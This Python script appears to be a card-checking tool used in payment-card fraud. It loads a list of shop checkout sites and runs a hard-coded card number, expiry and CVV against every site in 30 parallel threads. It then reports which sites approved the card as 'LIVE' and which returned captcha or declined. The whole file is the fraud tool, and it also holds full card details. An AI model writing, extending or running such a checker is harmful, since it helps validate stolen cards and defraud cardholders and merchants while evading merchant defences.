#!/usr/bin/env python3
import sys, os, time, concurrent.futures, threading
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import warnings; warnings.filterwarnings('ignore')
import logging; logging.disable(logging.CRITICAL)

import neww as checkout
from bott import check_single_card

CARD = {'number':'5136070130579948','month':1,'year':2027,'verification_value':'831','name':'Test Card'}
sites = checkout.read_sites_from_file('working_sites.txt')

approved_sites = []
declined_sites = []
captcha_sites  = []
unknown_sites  = []

def check(site):
    t0 = time.time()
    try:
        status, code, amount, site_label, _, shop_url, _ = check_single_card(CARD, [site], None)
        return site, status, code, time.time()-t0
    except Exception as e:
        return site, 'unknown', str(e)[:60], time.time()-t0

with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
    futs = {ex.submit(check, s): s for s in sites}
    for fut in concurrent.futures.as_completed(futs):
        site, status, code, t = fut.result()
        code_clean = (code or '').replace('"','').strip()
        if status == 'captcha':
            captcha_sites.append(site)
        elif status in ('approved','charged'):
            approved_sites.append((site, code_clean))
        elif status == 'declined':
            declined_sites.append((site, code_clean))
        else:
            unknown_sites.append((site, code_clean))

print('='*70)
print(f'SCAN: 5136070130579948|01|27|831  on  {len(sites)} sites')
print('='*70)
print(f'  ✅  APPROVED (card is LIVE)  : {len(approved_sites)}')
print(f'  ❌  DECLINED                 : {len(declined_sites)}')
print(f'  ⚠️   CAPTCHA                  : {len(captcha_sites)}')
print(f'  ❓  UNKNOWN/ERROR            : {len(unknown_sites)}')
print()

if approved_sites:
    print('--- APPROVED SITES ---')
    for s, c in sorted(approved_sites):
        print(f'  ✅  {s}  |  {c}')

if captcha_sites:
    print()
    print('--- CAPTCHA SITES ---')
    for s in sorted(captcha_sites):
        print(f'  ⚠️   {s}')

if unknown_sites:
    print()
    print('--- UNKNOWN/ERROR SITES (potential issues) ---')
    for s, c in sorted(unknown_sites):
        print(f'  ❓  {s}  |  {c}')
